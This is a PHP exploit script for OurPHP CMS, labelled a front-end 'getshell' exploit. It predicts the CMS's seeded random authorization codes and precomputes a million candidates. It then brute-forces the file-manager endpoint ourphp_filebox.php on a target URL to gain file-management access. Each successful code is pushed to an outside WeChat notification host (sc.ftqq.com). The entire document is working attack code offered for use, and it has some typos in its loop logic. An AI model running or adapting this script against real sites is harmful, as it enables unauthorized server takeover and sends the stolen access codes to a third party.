<?php 
error_reporting(0); 
set_time_limit(0);//ourphpcms 前台getshell exp  by 05
header("Content-type: text/html; charset=utf-8"); 
$GLOBALS['SCKEY'] = ""; //Server酱 的 SCKEY
function getRandomString($len, $n){
 $chars ="bcdefghijklmnpqrtuvwxyzBCDEFGHIJKLMNPQRTUVWXYZ12345679"; 
 mt_srand($n);
 for ($i = 0, $str = '', $lc = strlen($chars)-1; $i < $len; $i++){
 $str .= $chars[mt_rand(0, $lc)]; 
 }
 return $str;
}
function poc(){
 $code4 = '';
 for ($i = 0 ; $i < 1000000 ; $i++){
    $code=getRandomString(32,$i * 10);
    $code2 =  substr($code,6,6);
    $code3 = $code.$code2;
    $code4 .= "$code3\n";
    file_put_contents("i.txt", $i);
 }
file_put_contents("safecode.txt", $code4);
file_get_contents('https://sc.ftqq.com/'.$GLOBALS['SCKEY'].'.send?text='.urlencode('code OK！')); //微信推送功能
exit ('请确认getshell()函数中的$url变量内容是否修改为目标url,如确定修改,请刷新本页面。');
}
function getshell(){
$url = 'http://localhost/client/manage/ourphp_filebox.php?&op=&folder=./&validation=12345&code=';
$code=fopen('safecode.txt','rb+');
for ($i = 0 ; $i = !feof($code) ; $i++){
$code2 = fgets($code);
$code3 = rtrim($code2);
$code4 = file_get_contents($url.$code3);
if(strlen($code4) > 100){
file_put_contents("success.txt", $url.$code2);
file_get_contents('https://sc.ftqq.com/'.$GLOBALS['SCKEY'].'.send?text='.urlencode('成功Getshell,授权码请看详情').'&desp='.$code2); //微信推送功能
exit ("OK!请查看微信公众号推送或当前目录下的success.txt");
}
if ($i=feor($code)) {
file_get_contents('https://sc.ftqq.com/'.$GLOBALS['SCKEY'].'.send?text='.urlencode('Getshell失败'));
exit ("Getshell失败");
}
}
}
$file = "safecode.txt";
if(!file_exists($file))
{
    poc();
}
else
{
     getshell();
}
?>
